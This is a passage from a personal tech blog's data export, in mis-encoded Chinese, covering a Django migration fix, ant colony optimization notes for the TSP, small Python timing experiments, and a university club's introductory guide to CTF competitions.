å¦‚ä¸‹å›¾çº¢çº¿åŒºæ‰€ç¤º åœ¨ Vue.js å‰ç«¯å¼•å…¥ migrate æ— æŠ¥é”™ï¼Œè¿ç§»åæ•°æ®åº“æ²¡æœ‰å¢åŠ è¡¨æˆ‘æ˜¯æ‰‹åŠ¨ç›´æ¥åˆ é™¤äº† migrations é‡Œé¢çš„æ–‡ä»¶å’Œæ•°æ®åº“é‡Œé¢çš„è¡¨æ ¼ï¼Œï¼Œç„¶åæˆ‘æ”¹äº† models.py å makemigrations &amp;&amp; migrate æ•°æ®åº“ç«Ÿç„¶æ²¡æœ‰å¤šå‡ºè¡¨ã€‚ åŸæ¥ django æ•°æ®åº“é‡Œé¢ï¼Œæ˜¯æœ‰è¿™ä¸ªè¡¨æ ¼çš„ é‡Œé¢å­˜æ”¾ç€å…³äºæ•°æ®åº“è¿ç§»çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘æ‰‹åŠ¨åˆ é™¤äº†è¿ç§»è¡¨å’Œæ•°æ®åå¹¶æ²¡æœ‰ä»€ä¹ˆä¹±ç”¨ï¼Œæ•°æ®åº“ä»¥ä¸ºå®ƒè¿˜æ˜¯åœ¨çš„ï¼Œï¼Œæ‰€ä»¥ï¼Œæˆ‘é€‰æ‹©äº†åˆ é™¤æ‰€ä»¥è¡¨æ ¼ï¼Œï¼Œé‡æ–° makemigrations &amp;&amp; migrate å°±å¥½äº†ã€‚ å› ä¸ºè¿™æ˜¯ä¸ªäººä½œä¸šï¼Œï¼Œæ‰€ä»¥éšä¾¿åˆ äº†ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ã€‚ã€‚**","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"å¼€å‘/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"å¼€å‘/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"}],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"}]},{"title":"è®¡ç®—æ™ºèƒ½å®éªŒ","slug":"è®¡ç®—æ™ºèƒ½å®éªŒ","date":"2019-12-04T07:17:08.000Z","updated":"2021-04-02T02:14:30.450Z","comments":true,"path":"2019/12/04/è®¡ç®—æ™ºèƒ½å®éªŒ/","link":"","permalink":"https://tari.moe/2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/","excerpt":"","text":":) èšç¾¤ç®—æ³•ASæ±‚è§£ TSP å‚æ•°ä¸€è§ˆ(è®¾ä»»æ„ä¸¤ä¸ªåŸå¸‚çš„è·ç¦» $d_{ij}$ ä¸ºæ¬§å‡ é‡Œå¾·è·ç¦») AS ä¸­çš„éšæœºæ¯”ä¾‹è§„åˆ™(random proportional): å¯¹äºæ¯åªèš‚èš k, è·¯å¾„è®°å¿†å‘é‡ $R^{k}$ æŒ‰ç…§è®¿é—®é¡ºåºè®°å½•äº†æ‰€æœ‰ k å·²ç»ç»è¿‡çš„ç¨‹åºåºå· $ \\tau_{o}(i, j) = \\frac{m}{C^{nn}} $, mæ˜¯èš‚èšä¸ªæ•°, $C^{nn}$ æ˜¯ç”±è´ªå©ªç®—æ³•æ„é€ çš„è·¯å¾„çš„é•¿åº¦ è®¾èš‚èš k å½“å‰æ‰€åœ¨åŸå¸‚ä¸º i, åˆ™å…¶é€‰æ‹©åŸå¸‚ j ä½œä¸ºä¸‹ä¸€ä¸ªè®¿é—®å¯¹è±¡çš„æ¦‚ç‡ä¸º: $$p_{k}(i,j) = \\begin{cases}\\frac{[\\tau(i, j) ]^{\\alpha} [\\eta(i, j)^{\\beta } ]}{\\sum_{u \\in J_{k}(i) }[\\tau(i, u) ]^{\\alpha} [\\eta(i, u)^{\\beta } ]} &amp; \\text , ; j \\in J_{k}(i) \\;;;;;;;;;;;; 0 &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ è¡¨ç¤ºä»åŸå¸‚ i å¯ä»¥ç›´æ¥åˆ°è¾¾çš„ä¸”åˆä¸åœ¨èš‚èšè®¿é—®è¿‡çš„åŸå¸‚åºåˆ— $R^{k}$ ä¸­çš„åŸå¸‚é›†åˆ $\\eta(i, j)$ æ˜¯ä¸€ä¸ªå¯å‘å¼ä¿¡æ¯, é€šå¸¸ç”± $\\eta(i, j) = \\frac{1}{d_{ij}}$ ç›´æ¥è®¡ç®— $\\tau(i, j)$ è¡¨ç¤ºè¾¹ (i, j) ä¸Šçš„ä¿¡æ¯ç´ é‡ $\\alpha$ å’Œ $\\beta $ æ˜¯ä¸¤ä¸ªé¢„å…ˆè®¾ç½®çš„å‚æ•°, å®éªŒè¡¨æ˜ $\\alpha$ = 1, $\\beta $ = 2 ~ 5 æ¯”è¾ƒåˆé€‚ åŸå¸‚ i ä¸ åŸå¸‚ j çš„ç›¸è¿è¾¹ä¸Šçš„ä¿¡æ¯ç´ é‡ $\\tau_(i, j)$ æŒ‰å¦‚ä¸‹å…¬å¼è¿›è¡Œæ›´æ–°: $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\sum_{ k=1 }^{m} \\Delta \\tau_{k}(i, j)\\\\Delta \\tau_{k}(i, j) = \\begin{cases}(C_{k})^{-1} &amp; , ; (i, j) \\in R^{k} \\0 &amp; ,; other\\end{cases}$$ m æ˜¯èš‚èšä¸ªæ•° $\\rho$ æ˜¯ä¿¡æ¯ç´ çš„è’¸å‘ç‡, è§„å®š $0 &lt; \\rho \\leqslant 1 $ , $\\rho$ é€šå¸¸è®¾ç½®ä¸º = 0.5 $\\Delta \\tau_{k}(i, j)$ æ˜¯ç¬¬ k åªèš‚èšåœ¨å®ƒç»è¿‡çš„è¾¹ä¸Šé‡Šæ”¾çš„ä¿¡æ¯ç´ é‡(æ²¡æ”¾è¿‡å½“ç„¶å°±å– 0 å•¦ï¼), å®ƒç­‰äºèš‚èš k æœ¬è½®æ„å»ºè·¯å¾„é•¿åº¦çš„å€’æ•° $C_{k}$ è¡¨ç¤ºè·¯å¾„é•¿åº¦, å®ƒæ˜¯ $R^{k}$ ä¸­æ‰€æœ‰è¾¹çš„é•¿åº¦å’Œ ACS ä¸ AS çš„ä¸åŒçš„ä¸‰ä¸ªæ–¹é¢å‚æ•°ä¸€è§ˆ####çŠ¶æ€è½¬ç§»è§„åˆ™ï¼Œ ACSä¸­çš„ä¼ªéšæœºæ¯”ä¾‹è§„åˆ™(pseudorandom proportional): å¯¹äºæ¯åªèš‚èš k, è·¯å¾„è®°å¿†å‘é‡ $R^{k}$ æŒ‰ç…§è®¿é—®é¡ºåºè®°å½•äº†æ‰€æœ‰ k å·²ç»ç»è¿‡çš„ç¨‹åºåºå· è®¾èš‚èš k å½“å‰æ‰€åœ¨åŸå¸‚ä¸º i, åˆ™ä¸‹ä¸€ä¸ªè®¿é—®åŸå¸‚: $$j = \\begin{cases}arg ; max_{j \\in J_{k}(i)} {[\\tau(i, j) ], [\\eta(i, j)^{\\beta }]} &amp; \\text , ; q \\leqslant q_{0} \\S &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ è¡¨ç¤ºä»åŸå¸‚ i å¯ä»¥ç›´æ¥åˆ°è¾¾çš„ä¸”åˆä¸åœ¨èš‚èšè®¿é—®è¿‡çš„åŸå¸‚åºåˆ— $R^{k}$ ä¸­çš„åŸå¸‚é›†åˆ $\\eta(i, j)$ æ˜¯ä¸€ä¸ªå¯å‘å¼ä¿¡æ¯, é€šå¸¸ç”± $\\eta(i, j) = \\frac{1}{d_{ij}}$ ç›´æ¥è®¡ç®— $\\tau(i, j)$ è¡¨ç¤ºè¾¹ (i, j) ä¸Šçš„ä¿¡æ¯ç´ é‡ $\\beta$ æ˜¯æè¿°ä¿¡æ¯ç´ æµ“åº¦å’Œè·¯å¾„é•¿åº¦ä¿¡æ¯ç›¸å¯¹é‡è¦æ€§çš„æ§åˆ¶å‚æ•° $q_{0}$ æ˜¯ä¸€ä¸ª [0, 1] åŒºé—´å†…çš„å‚æ•°, å½“äº§ç”Ÿçš„éšæœºæ•° $q \\leqslant q_{0}$ æ—¶, èš‚èšç›´æ¥é€‰æ‹©ä½¿å¯å‘å¼ä¿¡æ¯ä¸ä¿¡æ¯ç´ é‡çš„ $\\beta$ æŒ‡æ•°ä¹˜ç§¯æœ€å¤§çš„ä¸‹ä¸€åŸå¸‚èŠ‚ç‚¹, æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºå¼€å‘(exploitation); åä¹‹, å½“äº§ç”Ÿçš„éšæœºæ•° $q &gt; q_{0}$ æ—¶, ACSå°†å’Œå„ç§ASç®—æ³•ä¸€æ ·ä½¿ç”¨è½®ç›˜èµŒé€‰æ‹©ç­–ç•¥, å³åå‘æ¢ç´¢(biased exploration) ä¿¡æ¯ç´ å…¨å±€æ›´æ–°è§„åˆ™ ä¸è®ºæ˜¯ä¿¡æ¯ç´ çš„è’¸å‘è¿˜æ˜¯é‡Šæ”¾, éƒ½åªåœ¨å±äºè‡³ä»Šæœ€ä¼˜è·¯å¾„çš„è¾¹ä¸Šè¿›è¡Œ $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\rho \\cdot \\Delta \\tau_{b}(i, j) , \\forall (i, j) \\in T_{b}$$ $\\Delta \\tau_{b}(i, j) = \\frac{1}{C_{b}}$ å‚æ•° $\\rho$ ä»£è¡¨ä¿¡æ¯ç´ è’¸å‘çš„é€Ÿç‡, æ–°å¢åŠ çš„ä¿¡æ¯ç´  $\\Delta \\tau_{b}(i, j)$ è¢«ä¹˜ä¸Šç³»æ•° $\\rho$ å, æ›´æ–°åçš„ä¿¡æ¯ç´ æµ“åº¦è¢«æ§åˆ¶åœ¨æ—§ä¿¡æ¯ç´ é‡ä¸æ–°é‡Šæ”¾çš„ä¿¡æ¯ç´ é‡ä¹‹é—´, ç”¨ä¸€ç§éšå«çš„åˆæ›´ç®€å•çš„æ–¹å¼å®ç°äº† MMAS ç®—æ³•ä¸­å¯¹ä¿¡æ¯ç´ é‡å–å€¼èŒƒå›´çš„é™åˆ¶ ä¿¡æ¯ç´ å±€éƒ¨æ›´æ–°è§„åˆ™$$\\tau(i, j) = (1 - \\xi) \\cdot \\tau(i, j) + \\xi \\cdot \\tau_{0}$$ $\\xi$ æ˜¯ä¿¡æ¯ç´ å±€éƒ¨æŒ¥å‘é€Ÿç‡, æ»¡è¶³ $0 &lt; \\xi &lt; 1$, é€šè¿‡å®éªŒå‘ç° $\\xi = 0.1$ $\\tau_{0}$ æ˜¯ä¿¡æ¯ç´ çš„åˆå§‹å€¼, å–å€¼ä¸º $\\frac{1}{nC^{nn}}$ æ—¶, å¯¹å¤§å¤šæ•°å®ä¾‹æœ‰ç€éå¸¸å¥½çš„æ€§èƒ½. å…¶ä¸­ n ä¸ºåŸå¸‚ä¸ªæ•°, $C^{nn}$ æ˜¯ç”±è´ªå©ªç®—æ³•æ„é€ çš„è·¯å¾„çš„é•¿åº¦","categories":[{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[{"name":"å­¦æ ¡è¯¾ç¨‹","slug":"å­¦æ ¡è¯¾ç¨‹","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}]},{"title":"è®°å½•ä¸€äº›æ‚ä¹±çš„ä¸œè¥¿","slug":"ä¹±ä¸ƒå…«ç³Ÿ","date":"2019-11-18T06:26:32.000Z","updated":"2021-04-02T02:14:43.159Z","comments":true,"path":"2019/11/18/ä¹±ä¸ƒå…«ç³Ÿ/","link":"","permalink":"https://tari.moe/2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/","excerpt":"","text":"èƒ½é‡æ˜¯æ ‡é‡è¿™å¥è¯æ„å‘³æ·±è¿œå‘€ ï½ä¸€ç¾¤äººçº ç»“äº†ä¸€å¤©è¿™ä¸ªé¢˜ç›®çš„ç»“æœæ˜¯æ ‡é‡è¿˜æ˜¯çŸ¢é‡ï¼Œ23333 äºŒè¿›åˆ¶çš„é­…åŠ›~è€ä¹…ä¹‹å‰ä¸€ç›´æƒ³è®°ä¸‹æ¥, ä¸€ç›´å¿˜äº†â€¦ 12345678910111213141516import timenum_need_validate = 123423cnt = 10**7a = 0 time_start1 = time.time()for i in range(cnt): if (num_need_validate % 2) != 0: a = a + 1# å¹³å‡åœ¨è¿™ä¸ªæ•°å­— 2.133270025253296print(time.time() - time_start1) 123456789101112131415161718import mathimport timenum_need_validate = 123423cnt = 10**7a = 0time_start2 = time.time()for i in range(cnt): if (num_need_validate &amp; 0) : a = a + 1 # å¹³å‡åœ¨è¿™ä¸ªæ•°å­— 0.8398542404174805print(time.time() - time_start2) linux è¶£äº‹ä¸€ç›´å¾ˆå¥½å¥‡ vim çš„ hjkl æ–¹å‘é”® ä»¥åŠ ~ ä¸ºä»€ä¹ˆæ˜¯æ ¹ç›®å½•â€¦https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys","categories":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"ä½›å¤§2019çº¢å¸½æ¯ç›¸å…³å’¨è¯¢","slug":"2019hmb","date":"2019-10-17T16:09:54.000Z","updated":"2021-04-04T05:10:06.534Z","comments":true,"path":"2019/10/18/2019hmb/","link":"","permalink":"https://tari.moe/2019/10/18/2019hmb/","excerpt":"","text":"1.ä»€ä¹ˆæ˜¯CTFCTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚ 2.ä»€ä¹ˆæ˜¯çº¢å¸½æ¯çº¢å¸½æ¯æ˜¯ç”±å¹¿ä¸œçœè®¡ç®—æœºä¿¡æ¯ç½‘ç»œå®‰å…¨åä¼šå°†äº2019å¹´11æœˆåœ¨å¹¿å·ä¸¾åŠç¬¬ä¸‰å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨æ”»é˜²ï¼ˆCTFï¼‰å¤§èµ›ã€‚ æŠ¥åæ—¶é—´10æœˆ10æ—¥00:00 - 11æœˆ07æ—¥24:00 åˆèµ›æ—¶é—´11æœˆ10æ—¥09:00 - 11æœˆ11æ—¥09:00 æŠ¥åå®˜æ–¹ç½‘ç«™ https://www.cinsa.org.cn/2019redhat æ¬¢è¿å’¨è¯¢ä½›å¤§ä¿¡æ¯å®‰å…¨åä¼š å¾®ä¿¡å·ï¼š èŒƒåŒå­¦ï¼šfjw712452 åˆ˜åŒå­¦ï¼šGlan5812 å¾åŒå­¦ï¼šGtari720 3.å…¥é—¨CTFï¼Œä½ éœ€è¦ä»€ä¹ˆ å¿«é€Ÿå­¦ä¹ æ–°äº‹ç‰©çš„èƒ½åŠ› ä¸€ä¸ªä¸ä¸€æ ·çš„æ€è€ƒæ–¹å¼ ä¸€é¢—ä¹äºè§£å†³é—®é¢˜çš„å¿ƒ ä¸€äº›æœ‰è¶£çš„ç½‘ç»œå®‰å…¨æŠ€æœ¯ ä¸€æ®µå……å®å¥‹æ–—çš„æ—¶å…‰ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½ç»™äºˆä½ ä¸€äº›å»ºè®®ï¼š å–„ç”¨ Google æœç´¢å¯ä»¥å¸®åŠ©ä½ æ›´å¥½åœ°æå‡è‡ªå·± æŒæ¡è‡³å°‘ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œæ¯”å¦‚ Python å®è·µæ¯”ä»€ä¹ˆéƒ½è¦ç®¡ç”¨ ä¿æŒå¯¹æŠ€æœ¯çš„å¥½å¥‡ä¸æ¸´æœ›å¹¶åšæŒä¸‹å» 4.CTFæ˜¯æ€ä¹ˆæ¯”èµ›çš„ç”±äº CTF çš„è€ƒé¢˜èŒƒå›´å…¶å®æ¯”è¾ƒå®½å¹¿ï¼Œç›®å‰ä¹Ÿæ²¡æœ‰å¤ªæ˜ç¡®çš„è§„å®šç•Œé™è¯´ä¼šè€ƒå“ªäº›å†…å®¹ã€‚ä½†æ˜¯å°±ç›®å‰çš„æ¯”èµ›é¢˜å‹è€Œè¨€çš„è¯ï¼Œä¸»è¦è¿˜æ˜¯ä¾æ®å¸¸è§çš„ Web ç½‘ç»œæ”»é˜²ã€RE é€†å‘å·¥ç¨‹ã€Pwn äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ã€Crypto å¯†ç æ”»å‡»ã€Mobile ç§»åŠ¨å®‰å…¨ ä»¥åŠ Misc å®‰å…¨æ‚é¡¹ æ¥è¿›è¡Œåˆ†ç±»ã€‚ Web - ç½‘ç»œæ”»é˜²ä¸»è¦ä¸º Web å®‰å…¨ä¸­å¸¸è§çš„æ¼æ´ï¼Œå¦‚ SQL æ³¨å…¥ã€XSSã€CSRFã€æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶ä¸Šä¼ ã€ä»£ç å®¡è®¡ã€PHP å¼±ç±»å‹ç­‰ï¼ŒWeb å®‰å…¨ä¸­å¸¸è§çš„é¢˜å‹åŠè§£é¢˜æ€è·¯ï¼Œå¹¶æä¾›äº†ä¸€äº›å¸¸ç”¨çš„å·¥å…·ã€‚ Reverse Engineering - é€†å‘å·¥ç¨‹ä¸»è¦ä¸ºé€†å‘å·¥ç¨‹ä¸­çš„å¸¸è§é¢˜å‹ã€å·¥å…·å¹³å°ã€è§£é¢˜æ€è·¯ï¼Œè¿›é˜¶éƒ¨åˆ†ä»‹ç»äº†é€†å‘å·¥ç¨‹ä¸­å¸¸è§çš„è½¯ä»¶ä¿æŠ¤ã€åç¼–è¯‘ã€åè°ƒè¯•ã€åŠ å£³è„±å£³æŠ€æœ¯ã€‚ Pwn - äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨Pwn é¢˜ç›®ä¸»è¦è€ƒå¯ŸäºŒè¿›åˆ¶æ¼æ´çš„å‘æ˜å’Œåˆ©ç”¨ï¼Œéœ€è¦å¯¹è®¡ç®—æœºæ“ä½œç³»ç»Ÿåº•å±‚æœ‰ä¸€å®šçš„äº†è§£ã€‚åœ¨ CTF ç«èµ›ä¸­ï¼ŒPWN é¢˜ç›®ä¸»è¦å‡ºç°åœ¨ Linux å¹³å°ä¸Šã€‚ Crypto - å¯†ç æ”»å‡»ä¸»è¦åŒ…æ‹¬å¤å…¸å¯†ç å­¦å’Œç°ä»£å¯†ç å­¦ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œå¤å…¸å¯†ç å­¦è¶£å‘³æ€§å¼ºï¼Œç§ç±»ç¹å¤šï¼Œç°ä»£å¯†ç å­¦å®‰å…¨æ€§é«˜ï¼Œå¯¹ç®—æ³•ç†è§£çš„è¦æ±‚è¾ƒé«˜ã€‚ Mobile - ç§»åŠ¨å®‰å…¨ä¸»è¦ä¸ºå®‰å“é€†å‘ä¸­çš„å¸¸ç”¨å·¥å…·å’Œä¸»è¦é—®é¢˜ç±»å‹ï¼Œå®‰å“é€†å‘å¸¸å¸¸éœ€è¦ä¸€å®šçš„å®‰å“å¼€å‘çŸ¥è¯†ï¼ŒiOS é€†å‘é¢˜ç›®åœ¨ CTF ç«èµ›ä¸­è¾ƒå°‘å‡ºç°ï¼Œå› æ­¤ä¸ä½œè¿‡å¤šä»‹ç»ã€‚ Misc - å®‰å…¨æ‚é¡¹ä»¥è¯¸è‘›å»ºä¼Ÿç¿»è¯‘çš„ã€Šçº¿ä¸Šå¹½çµï¼šä¸–ç•Œå¤´å·é»‘å®¢ç±³ç‰¹å°¼å…‹è‡ªä¼ ã€‹å’Œä¸€äº›å…¸å‹ MISC é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œå†…å®¹ä¸»è¦åŒ…æ‹¬ä¿¡æ¯æœé›†ã€ç¼–ç åˆ†æã€å–è¯åˆ†æã€éšå†™åˆ†æç­‰ã€‚ 5.CTFæ–¹å‘é‚£ä¹ˆå¤šï¼Œæˆ‘é€‰æ‹©é‚£ä¸€æ¡å‘¢ è¿™éœ€è¦ä½ è‡ªå·±é€‰æ‹©ä¸€ä¸ªé€‚åˆçš„æ–¹å‘ï¼Œä¸‹é¢æ˜¯å„ä¸ªæ–¹å‘çš„ä»‹ç»ã€‚ Aæ–¹å‘ï¼šPWN+Reverse+Cryptoéšæœºæ­é… IDAå·¥å…·ä½¿ç”¨ï¼ˆf5æ’ä»¶ï¼‰ã€é€†å‘å·¥ç¨‹ã€å¯†ç å­¦ã€ç¼“å†²åŒºæº¢å‡ºç­‰ Bæ–¹å‘ï¼šWeb+Misc ç½‘ç»œå®‰å…¨ã€å†…ç½‘æ¸—é€ã€æ•°æ®åº“å®‰å…¨ç­‰ å…¬å…±éƒ¨åˆ†ï¼šLinuxåŸºç¡€ã€è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€ç½‘ç»œåè®®åˆ†æ è¿™æ˜¯ç®€å•çš„ä»‹ç»ï¼Œå»é€‰æ‹©ä¸€æ¡å±äºè‡ªå·±çš„è·¯å§ï¼ PWNã€Reverseåé‡å¯¹æ±‡ç¼–ã€é€†å‘çš„ç†è§£ Cryptoåé‡å¯¹æ•°å­¦ã€ç®—æ³•çš„æ·±å…¥å­¦ä¹  Webåé‡å¯¹æŠ€å·§æ²‰æ·€ã€å¿«é€Ÿæœç´¢èƒ½åŠ›çš„æŒ‘æˆ˜ Miscæ¯”è¾ƒå¤æ‚ï¼Œæ‰€æœ‰ä¸è®¡ç®—æœºå®‰å…¨æŒ‘æˆ˜æœ‰å…³çš„éƒ½ç®—åœ¨å…¶ä¸­ 6.æˆ‘é€‰å¥½äº†è·¯ï¼Œä½†æ˜¯æ€ä¹ˆå»å­¦ä¹ å‘¢ä¸‹é¢æ¨èå‡ æœ¬ä¹¦ï¼š Aæ–¹å‘ï¼šIDA proæƒå¨æŒ‡å—ï¼ˆé‡è¦ï¼‰æ­ç§˜å®¶åº­è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯RE for Beginnersï¼ˆé€†å‘å·¥ç¨‹å…¥é—¨ï¼‰è‡ªå·±åŠ¨æ‰‹å†™æ“ä½œç³»ç»Ÿé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ï¼šç³»ç»Ÿå®æˆ˜ç¯‡ Bæ–¹å‘ï¼šWebåº”ç”¨å®‰å…¨æƒå¨æŒ‡å—ï¼ˆé€‚åˆå°ç™½å…¥é—¨å¯¹WEBå®‰å…¨è¿›è¡Œå®è§‚çš„ç†è§£ï¼‰é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ Webå®æˆ˜ç¯‡Webå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜é»‘å®¢ç§˜ç±-æ¸—é€æµ‹è¯•å®ç”¨æŒ‡å—ä»£ç å®¡è®¡ï¼šä¼ä¸šçº§Webä»£ç å®‰å…¨æ¶æ„ 7.webã€Reverseã€PWNã€Cryptoå’ŒMiscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼è¯·æˆ³æˆ‘ï¼8.æ€»ç»“CTFå¯èƒ½é—¨æ§›æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯å…¥é—¨ä¹‹åä½ ä¼šå‘ç°å…¶ä¹è¶£ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°æŒ«æŠ˜ä¸è¦è½»æ˜“æ”¾å¼ƒï¼Œå»ºè®®å…ˆè°·æ­ŒæŸ¥æ‰¾ç›¸å…³èµ„æ–™ï¼Œå®åœ¨æŸ¥ä¸åˆ°å†æ±‚åŠ©ä»–äººã€‚ å…³äºå¦‚ä½•æé—®ï¼Œå»ºè®®é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼šæé—®çš„æ™ºæ…§ æœ‰ä»»ä½•é—®é¢˜æ¬¢è¿åˆ°ç¾¤é‡Œæˆ–è”ç³»åä¼šæˆå‘˜ã€‚ è¡¥å…… Q1: è¦æ˜¯æˆ‘æŠ€æœ¯ä¸å¥½æˆ–è€…åŸºç¡€ä¸å¤ªå¥½æ€ä¹ˆåŠï¼Ÿä½ ä»¬ä¼šæ•™å—ï¼Ÿ A1: ä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘ä»¬ä¼šæ ¹æ®ä½ ä»¬å¤§éƒ¨åˆ†äººçš„åŸºç¡€ï¼Œç»™äºˆä½ ä»¬ç›¸å…³èµ„æ–™å’Œå¤šæ¬¡çº¿ä¸‹åŸ¹è®­ã€‚ä¸ç”¨æ‹…å¿ƒè‡ªå·±ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œä¸€å¼€å§‹è°éƒ½æ˜¯å°ç™½ï¼Œæœ¬æ¬¡çº¢å¸½æ¯å‚èµ›åŒ†å¿™æ€•å–å¾—ä¸äº†å¥½æˆç»©çš„ï¼Œä¹Ÿå¯ä»¥ä¸º12æœˆä»½ç™¾åº¦æ¯ï¼Œæ˜å¹´1æœˆä»½å®‰æ’æ¯åšå‡†å¤‡å–”ï¼ Q2ï¼š æ•™ç»ƒï¼Œæˆ‘è¿«ä¸åŠå¾…æƒ³çœ‹çœ‹ctfå¤§æ¦‚æ˜¯æ€æ ·çš„ A2ï¼š è¿™ä¸ªæ˜¯ä¸­ç§‘å¤§çš„æ–°ç”Ÿctfèµ›ã€‚ç›¸å¯¹ä¼šç®€å•äº›çš„ã€‚å¦‚æœæœ‰è¿«ä¸åŠå¾…æƒ³äº†è§£ctfæ˜¯æ€æ ·çš„åŒå­¦å¯ä»¥æ³¨å†Œä¸ªè´¦å·ç©ç©ï¼Œä¸æ‡‚çš„å¯ä»¥ç™¾åº¦æˆ–è€…ç¾¤ä¸Šé—®å–”ï¼ https://hack.lug.ustc.edu.cn/ 2019 å¹´åº¦ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬å…­å±Šä¿¡æ¯å®‰å…¨ç«èµ›å³å°†å¼€å¹•ï¼Œç§‘å¤§ä¿¡æ¯å®‰å…¨å¤§èµ›è‡ª 2014 å¹´èµ·å·²ç»è¿ç»­ä¸¾åŠäº”å±Šï¼Œå¾€å±Šæ¯”èµ›å‡é¡ºåˆ©ä¸¾è¡Œï¼Œè§„æ¨¡ç››å¤§ï¼Œå½±å“ç”šå¹¿ã€‚ èµ›åˆ¶ï¼šä¸ªäººçº¿ä¸Šæ¯”èµ›ï¼Œè§£é¢˜æ¨¡å¼ï¼Œçº¦ 25 é“é¢˜ç›®ï¼› æ¯”èµ›é¢˜ç›®åˆ†ä¸º 4 ç±»ï¼Œåˆ†ç±»å¦‚ä¸‹ï¼šç»¼åˆæŠ€èƒ½ï¼ˆgeneralï¼‰ã€ç¨‹åºé€†å‘ä¸æ¼æ´åˆ©ç”¨ï¼ˆbinaryï¼‰ã€å¯†ç å­¦ä¸æ•°å­¦ï¼ˆmathï¼‰ã€ç½‘ç«™å®‰å…¨ï¼ˆwebï¼‰","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"å…¥é—¨","slug":"ctf/å…¥é—¨","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"å…¥é—¨","slug":"å…¥é—¨","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"ä½›å¤§2019çº¢å¸½æ¯å…¥é—¨æŒ‡å¯¼","slug":"2019hmb_guide","date":"2019-10-17T06:09:50.000Z","updated":"2021-04-04T05:10:03.823Z","comments":true,"path":"2019/10/17/2019hmb_guide/","link":"","permalink":"https://tari.moe/2019/10/17/2019hmb_guide/","excerpt":"","text":"Webå…¥é—¨ä¼ é€é—¨Re é€†å‘ å…¥é—¨ä¼ é€é—¨PWN äºŒè¿›åˆ¶ å…¥é—¨ä¼ é€é—¨Crypto å¯†ç å­¦ å…¥é—¨ä¼ é€é—¨Misc æ‚é¡¹ å…¥é—¨ä¼ é€é—¨ èŒæ–°å…¥é—¨åˆ·é¢˜ä¼ é€é—¨ 